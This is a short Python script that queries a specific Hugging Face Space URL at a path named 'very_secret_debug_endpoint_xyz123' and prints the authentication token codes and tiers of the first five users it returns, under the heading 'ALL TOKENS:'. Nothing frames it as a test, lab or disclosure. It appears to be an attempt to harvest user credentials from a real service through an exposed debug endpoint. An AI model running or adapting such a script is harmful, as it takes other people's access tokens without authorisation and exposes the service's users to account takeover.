import urllib.request
import json
url = "https://ali-mahmoud-830-urei-scraper-api.hf.space/api/very_secret_debug_endpoint_xyz123"
req = urllib.request.Request(url)
with urllib.request.urlopen(req) as r:
    data = json.loads(r.read().decode())
    users = data.get("users", [])
    print("ALL TOKENS:")
    for u in users[:5]:
        print(f"Token: {u.get('token_code')} | Tier: {u.get('tier')}")
